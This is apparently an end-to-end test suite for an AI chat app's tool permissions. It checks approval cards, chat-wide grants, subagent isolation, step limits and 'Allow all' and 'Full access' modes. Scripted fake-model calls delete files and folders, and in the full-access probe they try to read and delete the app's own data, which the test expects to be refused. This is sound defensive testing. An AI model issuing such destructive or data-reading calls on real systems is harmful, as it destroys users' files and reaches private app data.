    Fake.queue.append({"tool_calls": [{"name": "read_file", "arguments": {"path": path}}]})
    Fake.queue.append({"content": "read it"})
    send(s, "read")
    answer_card(s, "Allow for this chat")
    wait_idle(s)
    # The same call now runs under the grant.
    Fake.queue.append({"tool_calls": [{"name": "read_file", "arguments": {"path": path}}]})
    Fake.queue.append({"content": "read it again"})
    send(s, "read again")
    wait_idle(s)
    assert "Allow once" not in s.page_text()
    # A call written as text is recovered and always asks, grant or not.
    # A read written as text may use the grant (13.3 step 4); a write written as text always asks,
    # even after a native write was allowed for the chat.
    wpath = str(c.work / "w.txt")
    Fake.queue.append({"tool_calls": [{"name": "write_file", "arguments": {"path": wpath, "content": "one"}}]})
    Fake.queue.append({"content": "wrote"})
    send(s, "write")
    answer_card(s, "Allow for this chat")
    wait_idle(s)
    Fake.queue.append({"content": '<tool_call>{"name": "write_file", "arguments": {"path": "%s", "content": "two"}}</tool_call>' % wpath})
    Fake.queue.append({"content": "wrote again"})
    send(s, "write as text")
    s.wait_for(lambda: "Allow once" in s.page_text() or idle(s), 30, "card or done")
    card = s.page_text()
    assert "Allow once" in card, "a recovered write ran without asking"
    assert "Allow for this chat" not in card, "a recovered call offered a chat-wide grant"
    assert "<tool_call>" not in card, "tool-call markup shown as the answer"
    time.sleep(0.9)
    s.click_button("Deny")
    wait_idle(s)
    assert open(wpath).read() == "one", "a denied write changed the file"
    # Forget the grant in the Tools panel: the next native call asks again.
    s.click_button("Tools")
    s.wait_text("Forget everything I allowed in this chat", 10)
    s.click_button("Forget everything I allowed in this chat")
    # The panel closes when the app has forgotten: only then is the next call sent.
    s.wait_for(lambda: "Forget everything I allowed in this chat" not in s.page_text(), 10, "the panel closes after forgetting")
    time.sleep(0.3)
    Fake.queue.append({"tool_calls": [{"name": "read_file", "arguments": {"path": path}}]})
    Fake.queue.append({"content": "fourth read"})
    send(s, "read once more")
    s.wait_for(lambda: "Allow once" in s.page_text() or idle(s), 30, "card or done")
    assert "Allow once" in s.page_text(), "the grant survived Forget"
    time.sleep(0.9)
    s.click_button("Deny")
    wait_idle(s)
    audit = [(a["tool"], a["decision"]) for a in s.invoke("list_audit", {"filter": {"chatId": chat}})]
    notes.append("audit: " + json.dumps(audit))


@probe("subagent")
def p_subagent(c, notes):
    s = c.s
    assert "run_subagent" in c.all_tools, "the tool is not registered"
    assert "run_subagent" not in c.default_tools, "Subagents are on in a new chat"
    chat = new_chat(c)
    path = str(c.work / "notes.txt")
    # Something earlier in the chat that the helper must never be sent.
    Fake.queue.append({"content": "PARENT-EARLIER-ANSWER"})
    send(s, "PARENT-EARLIER-QUESTION")
    wait_idle(s)
    # Switch the group on in the Tools panel.
    s.click_button("Tools")
    s.wait_text("Subagents", 10)
    panel = s.page_text()
    assert "hand a task to a helper that works in its own context" in panel, panel[-600:]
    on = s.execute(
        """
        const label = [...document.querySelectorAll('section > label')].find(l => l.innerText.trim().startsWith('Subagents'));
        const box = label.querySelector('input');
        const before = box.checked;
        box.click();
        label.scrollIntoView();
        return before;
        """
    )
    assert on is False, "the Subagents group was already on"
    time.sleep(0.6)
    s.screenshot(str(OUT / "tools-panel-subagents.png"))
    tools = {t["exposed"]: t for t in s.invoke("list_chat_tools", {"chatId": chat})}
    assert tools["run_subagent"]["enabledInChat"] and tools["run_subagent"]["server"] == "subagents", tools["run_subagent"]
    s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
    time.sleep(0.3)

    # 1. The turn hands a task over; the helper reads a file (a card), answers; the turn answers.
    task = "Read the notes file and report the secret word. HELPER-TASK-771"
    Fake.requests.clear()
    Fake.queue.append({"tool_calls": [{"name": "run_subagent", "arguments": {"task": task, "context": f"The file is {path}"}}]})
    # The helper's requests report a prompt of 7,777 tokens: that must never become the chat's.
    Fake.queue.append({"tool_calls": [{"name": "read_file", "arguments": {"path": path}}], "prompt_tokens": 7777})
    Fake.queue.append({"content": "the secret word is heron", "prompt_tokens": 7777})
    Fake.queue.append({"content": "PARENT-FINAL: the helper found the word."})
    send(s, "use a helper")
    s.wait_for(lambda: "Allow once" in s.page_text(), 30, "the helper's approval card")
    # The tool card's own status arrives a moment after the approval card.
    s.wait_for(lambda: "Waiting for you" in s.page_text(), 15, "the run_subagent tool card showing it is waiting")
    card = s.page_text()
    s.screenshot(str(OUT / "subagent-card.png"))
    assert "Subagent: " in card, "the card does not say it comes from a subagent: " + card[-500:]
    assert not any(n in card for n in ("7,777", "7,787")), "the helper's token count is shown as the chat's"
    assert f"read_file {path}"[:60] in card, "the tool card does not show what the helper is doing"
    time.sleep(0.9)
    s.click_button("Allow once")
    wait_idle(s)
    reqs = list(Fake.requests)
    assert len(reqs) == 4, len(reqs)
    names = lambda r: [t["function"]["name"] for t in r.get("tools", [])]  # noqa: E731
    roles = lambda r: [m["role"] for m in r["messages"]]  # noqa: E731
    assert "run_subagent" in names(reqs[0]) and names(reqs[0])[-1] == "run_subagent", names(reqs[0])
    # The helper's first request: a fresh history, the same system message, no run_subagent.
    first = reqs[1]
    assert roles(first) == ["system", "user"], roles(first)
    assert first["messages"][0]["content"] == reqs[0]["messages"][0]["content"], "the helper has another system message"
    user = json.dumps(first["messages"][1]["content"])
    assert task in user and path in user and "[App note]" in user, user[:400]
    assert "PARENT-EARLIER" not in json.dumps(first) and "use a helper" not in json.dumps(first), "the helper was sent the chat"
    assert "run_subagent" not in names(first) and "read_file" in names(first), names(first)
    assert names(first) == names(reqs[0])[:-1], "the helper's tools are not the chat's minus run_subagent"
    assert first["model"] == reqs[0]["model"]
    # Its second request carries the file; the turn's next request only the answer.
    assert "heron" in json.dumps(reqs[2]["messages"][-1]) and roles(reqs[2])[:2] == ["system", "user"]
    last = reqs[3]["messages"][-1]
    assert last["role"] == "tool" and "the secret word is heron" in json.dumps(last), last
    assert task in json.dumps(reqs[3]["messages"]) and "PARENT-EARLIER-QUESTION" in json.dumps(reqs[3]["messages"])
    assert roles(reqs[3]).count("tool") == 1, "a helper message reached the chat's history"
    # The chat stores the turn's own messages only.
    msgs = messages(s, chat)
    turn = msgs[2:]
    notes.append("stored: " + json.dumps([(m["role"], [tc["name"] for tc in m.get("toolCalls") or []]) for m in turn]))
    assert [m["role"] for m in turn] == ["user", "assistant", "tool", "assistant"], [m["role"] for m in turn]
    assert [tc["name"] for m in turn for tc in (m.get("toolCalls") or [])] == ["run_subagent"]
    result = turn[2]["toolResult"]
    assert result["status"] == "ok" and result["text"] == "the secret word is heron", result
    assert "PARENT-FINAL" in turn[3]["text"]
    # The context numbers of the chat are the turn's own, not the helper's.
    assert "7777" not in json.dumps(msgs), "the helper's token count was stored on a chat message"
    header = s.execute("return document.querySelector('header')?.innerText || document.body.innerText.slice(0, 400);")
    notes.append("header: " + header.replace("\n", " | ")[:160])
    page = s.page_text()
    assert not any(n in page for n in ("7,777", "7777", "7,787", "7787")), "the helper's token count is shown as the chat's: " + header
    # The card shows the answer.
    s.execute("[...document.querySelectorAll('button[aria-expanded]')].filter(b => b.innerText.includes('run_subagent')).pop().click();")
    time.sleep(0.4)
    page = s.page_text()
    s.screenshot(str(OUT / "subagent-done.png"))
    assert "Result | the secret word is heron" in page.replace("\n", " | "), page[-500:]
    # Both calls are in the audit log; the helper's is marked and points at the turn's.
    audit = s.invoke("list_audit", {"filter": {"chatId": chat}})
    notes.append("audit: " + json.dumps([(a["tool"], a["decision"], a["result_status"], a["preview"][:40], a.get("parent_audit_id")) for a in audit]))
    run_row = [a for a in audit if a["tool"] == "run_subagent"]
    read_row = [a for a in audit if a["tool"] == "read_file"]
    assert len(run_row) == 1 and len(read_row) == 1, [a["tool"] for a in audit]
    assert run_row[0]["decision"] == "allowed_without_prompt" and run_row[0]["result_status"] == "ok", run_row[0]
    assert run_row[0]["server"] == "subagents" and "heron" in (run_row[0]["result_summary"] or ""), run_row[0]
    assert read_row[0]["decision"] == "allow_once" and read_row[0]["preview"].startswith("Subagent: "), read_row[0]
    assert read_row[0]["parent_audit_id"] == run_row[0]["id"], (read_row[0], run_row[0]["id"])

    # 2. A helper that tries to start a helper is refused.
    Fake.requests.clear()
    Fake.queue.append({"tool_calls": [{"name": "run_subagent", "arguments": {"task": "Delegate once more."}}]})
    Fake.queue.append({"tool_calls": [{"name": "run_subagent", "arguments": {"task": "NESTED-TASK-552"}}]})
    Fake.queue.append({"content": "I could not delegate, so I did it myself."})
    Fake.queue.append({"content": "PARENT-SECOND-ANSWER"})
    send(s, "let the helper try to delegate")
    wait_idle(s)
    reqs = list(Fake.requests)
    assert len(reqs) == 4, len(reqs)
    refusal = reqs[2]["messages"][-1]
    assert refusal["role"] == "tool" and "No such tool: run_subagent" in json.dumps(refusal), refusal
    assert all("NESTED-TASK-552" not in json.dumps(r["messages"][1]) for r in reqs[1:3]), "a nested helper was started"
    assert "I could not delegate" in json.dumps(reqs[3]["messages"][-1])
    audit = s.invoke("list_audit", {"filter": {"chatId": chat}})
    nested = [a for a in audit if a["tool"] == "run_subagent" and a["preview"].startswith("Subagent: ")]
    assert len(nested) == 1 and nested[0]["decision"] == "refused_by_policy", [(a["tool"], a["decision"], a["preview"][:30]) for a in audit]
    assert len([a for a in audit if a["tool"] == "run_subagent"]) == 3, "a nested helper has its own audit row"

    # 3. Stop while the helper streams ends the whole turn.
    Fake.requests.clear()
    Fake.queue.append({"tool_calls": [{"name": "run_subagent", "arguments": {"task": "Talk for a long time."}}]})
    Fake.queue.append({"content": "helperword " * 400, "chunk": 11, "delay": 0.05})
    send(s, "a slow helper")
    s.wait_for(lambda: "helperword" in s.page_text(), 30, "the helper's text on the tool card")
    time.sleep(0.5)
    started = time.time()
    s.click_button("Stop")
    s.wait_for(lambda: idle(s), 10, "the turn to stop")
    took = time.time() - started
    notes.append(f"stop took {took:.2f}s")
    assert took < 3.0, f"Stop took {took:.1f}s"
    time.sleep(0.6)
    msgs = messages(s, chat)
    assert msgs[-1]["role"] == "assistant" and msgs[-1].get("status") == "stopped", msgs[-1]
    stopped = [m for m in msgs if m["role"] == "tool"][-1]["toolResult"]
    assert stopped["status"] == "cancelled" and "The helper was stopped" in stopped["text"], stopped
    assert "helperword" in stopped["text"], "what the helper had so far was lost"
    before = len(Fake.requests)
    time.sleep(1.0)
    assert len(Fake.requests) == before == 2, f"requests after Stop: {len(Fake.requests)}"
    audit = s.invoke("list_audit", {"filter": {"chatId": chat}})
    newest = [a for a in audit if a["tool"] == "run_subagent"][0]
    assert newest["result_status"] == "cancelled", newest
    # The chat still works.
    Fake.queue.clear()
    Fake.queue.append({"content": "fine after the stopped helper"})
    send(s, "still there?")
    wait_idle(s)
    assert "fine after the stopped helper" in s.page_text()
    assert "PARENT-EARLIER-QUESTION" in json.dumps(Fake.requests[-1]["messages"])


@probe("step-limit")
def p_step_limit(c, notes):
    """Reported from a real PC: a long task stopped at "the step limit" with a red error
    and no way on. The limit is a setting now, and the stop offers Continue."""
    s = c.s
    for bad in (0, 501, "50"):
        try:
            s.invoke("set_setting", {"key": "stepsPerTurn", "value": bad})
            raise AssertionError(f"a step limit of {bad!r} was accepted")
        except WebDriverError as e:
            assert "whole number from 5 to 500" in str(e), e
    s.invoke("set_setting", {"key": "stepsPerTurn", "value": 5})
    try:
        chat = new_chat(c)
        s.invoke("set_chat_working_folder", {"chatId": chat, "path": str(c.work)})
        for i in range(5):
            (c.work / f"step{i}").mkdir(exist_ok=True)
            Fake.queue.append({"tool_calls": [{"name": "list_dir", "arguments": {"path": f"step{i}"}}]})
        Fake.queue.append({"content": "I listed five folders. One is left."})
        Fake.requests.clear()
        send(s, "list every folder")
        deadline = time.time() + 90
        while time.time() < deadline:
            time.sleep(0.4)
            if "Allow once" in s.page_text():
                time.sleep(0.9)
                s.click_button("Allow for this chat")
            elif idle(s):
                break
        # Five model calls, then the wrap-up request in which tools are off.
        assert len(Fake.requests) == 6, len(Fake.requests)
        assert Fake.requests[-1].get("tool_choice") == "none", Fake.requests[-1].get("tool_choice")
        notice = s.execute("const n = document.querySelector('[role=status]'); return n ? n.innerText : null;")
        notes.append("notice: " + str(notice).replace("\n", " | "))
        assert notice and "step limit" in notice and "Continue" in notice, notice
        assert s.execute("return document.querySelector('[role=alert]') === null"), "the stop is shown as an error"
        assert messages(s, chat)[-1]["text"] == "I listed five folders. One is left."
        s.screenshot(str(OUT / "step-limit.png"))
        Fake.queue.append({"content": "The last one is listed too."})
        s.click_button("Continue")
        wait_idle(s)
        msgs = [m for m in messages(s, chat) if m["role"] in ("user", "assistant")]
        assert msgs[-2]["text"] == "Continue where you left off.", msgs[-2]
        assert msgs[-1]["text"] == "The last one is listed too.", msgs[-1]
        assert "step limit" not in s.page_text(), "the notice stayed after Continue"
        # The setting shows in Settings, General.
        s.click_button("Settings")
        s.click_button("General")
        time.sleep(0.5)
        radios = "[...document.querySelectorAll('[aria-label=\"Steps per turn\"] [role=radio]')]"
        chosen = s.execute(f"return {radios}.filter(b => b.getAttribute('aria-checked') === 'true').map(b => b.innerText);")
        assert chosen == ["5"], chosen
        s.execute(f"{radios}.find(b => b.innerText === '100').click();")
        s.wait_for(lambda: s.invoke("get_setting", {"key": "stepsPerTurn"}) == 100, 10, "the choice is saved")
    finally:
        s.invoke("set_setting", {"key": "stepsPerTurn", "value": 50})


@probe("allow-all")
def p_allow_all(c, notes):
    """Owner's request for 0.0.4: "an allow all button so it doesn't ask for approval all the
    time (deleting any type of file or files still needs approval no matter what, but not
    code changes or file editing)"."""
    s = c.s
    files = ["read_file", "list_dir", "search_files", "write_file", "edit_file", "delete_file"]
    chat = new_chat(c, tools=[t for t in files if t in c.all_tools])
    folder = c.work / "allow-all"
    shutil.rmtree(folder, ignore_errors=True)
    folder.mkdir()
    a, b, kept = folder / "a.txt", folder / "b.txt", folder / "kept.txt"
    kept.write_text("keep me\n")

    def call(name, arguments):
        # A tool that is on but not shown this turn is run through call_tool (tool selection).
        offered = [t.get("function", {}).get("name") for t in (Fake.requests[-1].get("tools") or [])] if Fake.requests else []
        if name in offered or "call_tool" not in offered:
            return {"tool_calls": [{"name": name, "arguments": arguments}]}
        return {"tool_calls": [{"name": "call_tool", "arguments": {"name": name, "arguments": arguments}}]}

    def card_or_done():
        s.wait_for(lambda: "Allow once" in s.page_text() or idle(s), 30, "card or done")
        return "Allow once" in s.page_text()

    def no_card_until_done():
        time.sleep(0.4)
        deadline = time.time() + 60
        while time.time() < deadline:
            assert "Allow once" not in s.page_text(), "a card was shown in Allow all"
            if idle(s):
                return
            time.sleep(0.2)
        raise AssertionError("the turn did not finish")

    def click_in_confirmation(label):
        # The confirmation is the open dialog; a card behind it can carry the same label.
        time.sleep(0.9)
        done = s.execute(
            """
            const d = document.querySelector('[role=alertdialog][data-state=open]');
            const b = d && [...d.querySelectorAll('button')].find(x => x.innerText.trim() === arguments[0]);
            if (b) b.click();
            return !!b;
            """,
            label,
        )
        assert done, f"no {label!r} in the confirmation"
        time.sleep(0.4)

    def mode():
        return s.invoke("get_approval_mode", {"chatId": chat})

    def audit():
        return [(r["tool"], r["decision"]) for r in s.invoke("list_audit", {"filter": {"chatId": chat}})]

    try:
        assert s.invoke("get_allow_all_default") is False, "Allow all in every chat is on in a fresh install"
        assert mode() is False, "a new chat is not in Ask mode"
        Fake.queue.append({"content": "ready"})
        send(s, "hello")
        wait_idle(s)

        # 1. Ask first (the default): a write shows a card.
        s.wait_for(lambda: s.execute("return !!document.querySelector('button[aria-label=\"Ask first\"]');"), 10, "the Ask first button")
        Fake.queue.append(call("write_file", {"path": str(a), "content": "one\n"}))
        Fake.queue.append({"content": "not written"})
        send(s, "go on")
        assert card_or_done(), "a write ran without asking in Ask mode"
        card = s.page_text()
        assert "Allow for this chat" in card and "Allow all in this chat" in card, card[-400:]
        time.sleep(0.9)
        s.click_button("Deny")
        wait_idle(s)
        assert not a.exists(), "a denied write created the file"

        # Only the user's own command switches the mode: the generic settings command cannot.
        for key in ("allowAllDefault", "approvalMode", "allowAll"):
            try:
                s.invoke("set_setting", {"key": key, "value": True})
                raise AssertionError(f"set_setting accepted {key}")
            except WebDriverError as e:
                assert "cannot be changed this way" in str(e), e
        assert s.invoke("get_allow_all_default") is False and mode() is False

        # 2. The header menu: Allow all asks first, listing what still asks.
        choose_mode(s, "Ask first", "Allow all")
        s.wait_text("Allow all in this chat?", 10)
        dialog = s.execute(
            "const d = document.querySelector('[role=alertdialog][data-state=open]'); return d ? d.innerText : null;")
        (OUT / "allow-all-dialog.txt").write_text(dialog or "")
        s.screenshot(str(OUT / "allow-all-dialog.png"))
        for needle in ("It still asks before:", "Deleting files or folders", "git push", "Cancel"):
            assert needle in dialog, (needle, dialog)
        assert mode() is False, "opening the confirmation switched the mode"
        click_in_confirmation("Cancel")
        assert mode() is False, "Cancel switched the mode"
        choose_mode(s, "Ask first", "Allow all")
        s.wait_text("Allow all in this chat?", 10)
        click_in_confirmation("Allow all in this chat")
        s.wait_for(mode, 10, "the chat in Allow all")
        s.wait_for(lambda: s.execute("return !!document.querySelector('button[aria-label=\"Allow all\"]');"), 10, "the Allow all button")
        s.screenshot(str(OUT / "allow-all-on.png"))

        # 3. A write and an edit run with no card, and are audited as allowed by the mode.
        Fake.queue.append(call("write_file", {"path": str(a), "content": "one\n"}))
        Fake.queue.append(call("edit_file", {"path": str(a), "old_text": "one", "new_text": "two"}))
        Fake.queue.append({"content": "written and edited"})
        send(s, "go on")
        no_card_until_done()
        assert a.read_text() == "two\n", a.read_text() if a.exists() else "a.txt was not written"
        rows = audit()
        notes.append("audit: " + json.dumps(rows[:4]))
        assert ("write_file", "allowed_by_mode") in rows and ("edit_file", "allowed_by_mode") in rows, rows

        # 4. A delete still shows a card, with Allow once and Deny only.
        Fake.queue.append(call("delete_file", {"path": str(kept)}))
        Fake.queue.append({"content": "kept"})
        send(s, "go on")
        assert card_or_done(), "a delete ran without asking in Allow all"
        card = s.page_text()
        assert "this still asks" in card and "deletes files" in card, card[-500:]
        assert "Allow for this chat" not in card and "Allow all in this chat" not in card, card[-500:]
        s.screenshot(str(OUT / "allow-all-delete-card.png"))
        time.sleep(0.9)
        s.click_button("Deny")
        wait_idle(s)
        assert kept.read_text() == "keep me\n", "a denied delete removed the file"
        assert ("delete_file", "denied") in audit(), audit()

        # The audit log in Settings words it for people.
        s.click_button("Settings")
        s.click_button("Audit log")
        s.wait_text("allowed by Allow all", 10)
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
        time.sleep(0.4)

        # 5. Switching back needs no confirmation, and a write asks again.
        choose_mode(s, "Allow all", "Ask first")
        s.wait_for(lambda: mode() is False, 10, "the chat back in Ask mode")
        assert "Allow all in this chat?" not in s.page_text(), "switching back asked for confirmation"
        Fake.queue.append(call("write_file", {"path": str(b), "content": "three\n"}))
        Fake.queue.append({"content": "written"})
        send(s, "go on")
        assert card_or_done(), "a write ran without asking after switching back"

        # The card's third choice: confirm, and this card is approved and the chat switched.
        time.sleep(0.9)
        s.click_button("Allow all in this chat")
        s.wait_text("Allow all in this chat?", 10)
        assert not b.exists() and mode() is False, "the card's button acted before the confirmation"
        click_in_confirmation("Allow all in this chat")
        wait_idle(s)
        assert b.read_text() == "three\n"
        assert mode() is True
        assert ("write_file", "allow_once") in audit(), audit()

        # "Forget everything I allowed in this chat" ends Allow all in the chat too.
        s.click_button("Tools")
        s.wait_text("Forget everything I allowed in this chat", 10)
        s.click_button("Forget everything I allowed in this chat")
        s.wait_for(lambda: mode() is False, 10, "the chat back in Ask mode after Forget")
        s.wait_for(lambda: s.execute("return !!document.querySelector('button[aria-label=\"Ask first\"]');"), 10,
                   "the Ask first button after Forget")
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
        time.sleep(0.3)

        # "Allow all in every chat" in Settings: asks first, and is a saved setting.
        s.invoke("set_approval_mode", {"chatId": chat, "allowAll": False})
        s.click_button("Settings")
        s.click_button("Permissions")
        s.wait_text("Every chat starts in", 10)
        settings_radio(s, "Allow all")
        s.wait_text("Allow all in every chat?", 10)
        assert s.invoke("get_allow_all_default") is False
        click_in_confirmation("Allow all in every chat")
        s.wait_for(lambda: s.invoke("get_allow_all_default") is True, 10, "the default switched on")
        assert mode() is True, "an open chat did not follow the default"
        assert s.invoke("get_setting", {"key": "allowAllDefault"}) is True
        settings_radio(s, "Ask first")
        s.wait_for(lambda: s.invoke("get_allow_all_default") is False, 10, "the default switched off")
        assert mode() is False, "switching the default off left a chat in Allow all"
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
    finally:
        s.invoke("set_allow_all_default", {"on": False})
        s.invoke("set_approval_mode", {"chatId": chat, "allowAll": False})


@probe("full-access")
def p_full_access(c, notes):
    """Owner's request for 0.0.5: "stop asking me to allow everything ... name it full access",
    and "the ability for the models to create their own folders and navigate the pc on their
    own and stuff even delete and organize but this only works with full access on". Nothing
    asks; the file tools reach the whole computer; the app's own folders stay out of reach."""
    s = c.s
    wanted = ["read_file", "list_dir", "search_files", "write_file", "edit_file", "delete_file",
              "make_folder", "move_path", "delete_folder", "run_command"]
    chat = new_chat(c, tools=[t for t in wanted if t in c.all_tools])
    assert "make_folder" in c.all_tools, c.all_tools
    inside = c.work / "full-access"
    outside = c.other / "full-access"
    for d in (inside, outside):
        shutil.rmtree(d, ignore_errors=True)
        d.mkdir()
    (outside / "report.txt").write_text("quarterly numbers\n")
    (outside / "trash").mkdir()
    (outside / "trash" / "old.log").write_text("old\n")
    doomed = inside / "doomed.txt"
    doomed.write_text("bye\n")
    home = c.db.parents[2]  # <home>/data/<identifier>/app.db

    def offered():
        return [t.get("function", {}).get("name") for t in (Fake.requests[-1].get("tools") or [])] if Fake.requests else []

    def call(name, arguments):
        # A tool that is on but not shown this turn is run through call_tool (tool selection).
        if name in offered() or "call_tool" not in offered():
            return {"tool_calls": [{"name": name, "arguments": arguments}]}
        return {"tool_calls": [{"name": "call_tool", "arguments": {"name": name, "arguments": arguments}}]}

    def card_or_done():
        s.wait_for(lambda: "Allow once" in s.page_text() or idle(s), 30, "card or done")
        return "Allow once" in s.page_text()

    def no_card_until_done():
        time.sleep(0.4)
        deadline = time.time() + 60
        while time.time() < deadline:
            assert "Allow once" not in s.page_text(), "a card was shown in Full access"
            if idle(s):
                return
            time.sleep(0.2)
        raise AssertionError("the turn did not finish")

    def click_in_confirmation(label):
        time.sleep(0.9)
        done = s.execute(
            """
            const d = document.querySelector('[role=alertdialog][data-state=open]');
            const b = d && [...d.querySelectorAll('button')].find(x => x.innerText.trim() === arguments[0]);
            if (b) b.click();
            return !!b;
            """,
            label,
        )
        assert done, f"no {label!r} in the confirmation"
        time.sleep(0.4)

    def header(label):
        return s.execute(
            "return !!document.querySelector('button[aria-label=\"' + arguments[0] + '\"]');", label)

    def mode():
        return s.invoke("get_chat_approval_mode", {"chatId": chat})

    def audit():
        return s.invoke("list_audit", {"filter": {"chatId": chat}})

    try:
        assert s.invoke("get_default_approval_mode") == "ask", "a fresh install does not start in Ask first"
        assert mode() == "ask"
        # Outside Full access the folder tools are not offered at all.
        Fake.queue.append({"content": "ready"})
        send(s, "hello")
        wait_idle(s)
        assert not {"make_folder", "move_path", "delete_folder"} & set(offered()), offered()
        assert "Full access is on" not in json.dumps(Fake.requests[-1]["messages"][0])

        # Only the user's own command switches the mode: the generic settings command cannot.
        for key in ("approvalModeDefault", "allowAllDefault"):
            try:
                s.invoke("set_setting", {"key": key, "value": "fullAccess"})
                raise AssertionError(f"set_setting accepted {key}")
            except WebDriverError as e:
                assert "cannot be changed this way" in str(e), e

        # 1. The header menu: Full access asks first with a plain warning; Cancel changes nothing.
        s.wait_for(lambda: header("Ask first"), 10, "the Ask first button")
        choose_mode(s, "Ask first", "Full access")
        s.wait_text("Full access in this chat?", 10)
        dialog = s.execute(
            "const d = document.querySelector('[role=alertdialog][data-state=open]'); return d ? d.innerText : null;")
        (OUT / "full-access-dialog.txt").write_text(dialog or "")
        s.screenshot(str(OUT / "full-access-dialog.png"))
        for needle in ("delete", "trash", "trick", "app's own data", "Cancel", "Turn on Full access"):
            assert needle in dialog, (needle, dialog)
        assert mode() == "ask", "opening the confirmation switched the mode"
        click_in_confirmation("Cancel")
        assert mode() == "ask", "Cancel switched the mode"
        choose_mode(s, "Ask first", "Full access")
        s.wait_text("Full access in this chat?", 10)
        click_in_confirmation("Turn on Full access")
        s.wait_for(lambda: mode() == "fullAccess", 10, "the chat in Full access")
        s.wait_for(lambda: header("Full access"), 10, "the Full access button")
        s.screenshot(str(OUT / "full-access-on.png"))

        # 2. Nothing asks: a read outside the approved folders, a new folder, a move into it, a
        #    delete, a command, and a whole folder deleted, all without a card.
        Fake.queue.append(call("read_file", {"path": str(outside / "report.txt")}))
        Fake.queue.append(call("make_folder", {"path": str(outside / "sorted" / "2026")}))
        Fake.queue.append(call("move_path", {"from": str(outside / "report.txt"), "to": str(outside / "sorted" / "2026")}))
        Fake.queue.append(call("delete_file", {"path": str(doomed)}))
        Fake.queue.append(call("run_command", {"command": "echo made-by-command > made.txt", "cwd": str(outside)}))
        Fake.queue.append(call("delete_folder", {"path": str(outside / "trash")}))
        Fake.queue.append({"content": "organised"})
        send(s, "organise that folder")
        no_card_until_done()
        req = Fake.requests[-1]
        system = json.dumps(req["messages"][0])
        assert "Full access is on" in system, system[:2000]
        assert (outside / "sorted" / "2026" / "report.txt").read_text() == "quarterly numbers\n"
        assert not (outside / "report.txt").exists()
        assert not doomed.exists(), "the delete did not run"
        assert (outside / "made.txt").read_text().strip() == "made-by-command"
        assert not (outside / "trash").exists(), "delete_folder did not run"
        rows = audit()
        notes.append("audit: " + json.dumps([(r["tool"], r["decision"], r.get("note")) for r in rows[:8]]))
        for tool in ("read_file", "make_folder", "move_path", "delete_file", "run_command", "delete_folder"):
            assert any(r["tool"] == tool and r["decision"] == "allowed_by_mode" and r.get("note") == "Full access"
                       for r in rows), (tool, rows[:8])

        # 3. The app's own folders stay out of reach, and so does the folder that holds them.
        Fake.queue.append(call("read_file", {"path": str(c.db)}))
        Fake.queue.append(call("delete_folder", {"path": str(home)}))
        Fake.queue.append(call("list_dir", {"path": str(c.db.parents[1]), "depth": 2}))
        Fake.queue.append({"content": "refused"})
        send(s, "go on")
        no_card_until_done()
        assert c.db.exists() and home.exists()
        rows = audit()
        # Hard limits are recorded as refused by policy: no card, in every mode.
        assert any(r["tool"] == "read_file" and r["decision"] == "refused_by_policy" and str(c.db) in json.dumps(r["arguments"])
                   for r in rows), rows[:4]
        assert any(r["tool"] == "delete_folder" and r["decision"] == "refused_by_policy" and "app's own folders" in (r.get("note") or "")
                   for r in rows), rows[:4]
        listing = [m for m in messages(s, chat) if m["role"] == "tool"][-1]
        text = json.dumps(listing)
        assert "not reachable" in text and "app.db" not in text, text[:2000]

        # The audit log in Settings words it for people.
        s.click_button("Settings")
        s.click_button("Audit log")
        s.wait_text("allowed by Full access", 10)
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
        time.sleep(0.4)

        # 4. Back to Ask first: one click, no confirmation, and a write asks again.
        choose_mode(s, "Full access", "Ask first")
        s.wait_for(lambda: mode() == "ask", 10, "the chat back in Ask first")
        assert "Full access in this chat?" not in s.page_text()
        Fake.queue.append(call("write_file", {"path": str(outside / "after.txt"), "content": "x"}))
        Fake.queue.append({"tool_calls": [{"name": "make_folder", "arguments": {"path": str(inside / "nope")}}]})
        Fake.queue.append({"content": "refused"})
        send(s, "go on")
        wait_idle(s)
        assert "Allow once" not in s.page_text()
        assert not (outside / "after.txt").exists(), "a path outside the approved folders was written after Full access ended"
        assert not (inside / "nope").exists(), "a folder tool ran outside Full access"
        assert not {"make_folder", "move_path", "delete_folder"} & set(offered()), offered()

        # 5. Settings: the mode every chat starts in, saved, with the same confirmation.
        s.click_button("Settings")
        s.click_button("Permissions")
        s.wait_text("Every chat starts in", 10)
        settings_radio(s, "Full access")
        s.wait_text("Full access in every chat?", 10)
        assert s.invoke("get_default_approval_mode") == "ask"
        click_in_confirmation("Turn on Full access")
        s.wait_for(lambda: s.invoke("get_default_approval_mode") == "fullAccess", 10, "the default in Full access")
        assert mode() == "fullAccess", "an open chat did not follow the default"
        assert s.invoke("get_setting", {"key": "approvalModeDefault"}) == "fullAccess"
        assert s.invoke("get_setting", {"key": "allowAllDefault"}) is True
        settings_radio(s, "Ask first")
        s.wait_for(lambda: s.invoke("get_default_approval_mode") == "ask", 10, "the default back in Ask first")
        assert mode() == "ask", "switching the default back left a chat in Full access"
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
    finally:
        s.invoke("set_default_approval_mode", {"mode": "ask"})
        s.invoke("set_chat_approval_mode", {"chatId": chat, "mode": "ask"})


@probe("tool-selection")
def p_tool_selection(c, notes):
    """Adaptive tool selection: a turn shows the model a small set of the tools that are on,
    `find_tools` finds the others and `call_tool` runs them exactly like a direct call (the
    card and the audit row are the real tool's), a tool that is off stays out of reach, and
    the list only grows from turn to turn."""
    s = c.s
    names = lambda r: [t["function"]["name"] for t in r.get("tools", [])]  # noqa: E731
    estimate = lambda r: round(len(json.dumps(r.get("tools", []))) / 3.5)  # noqa: E731

    def listing(chat_id):
        return {t["exposed"]: t for t in s.invoke("list_chat_tools", {"chatId": chat_id})}

    def tool_results(chat_id):
        return [m["toolResult"] for m in messages(s, chat_id) if m["role"] == "tool"]

    def in_order(earlier, later):
        rest = iter(later)
        return all(any(x == y for y in rest) for x in earlier)

    # The catalog covers every built-in tool this app has registered, with examples the
    # tools' own schemas accept (the unit tests can only build some of the servers).
    problems = s.invoke("tool_catalog_problems")
    assert problems == [], "tool catalog: " + json.dumps(problems)
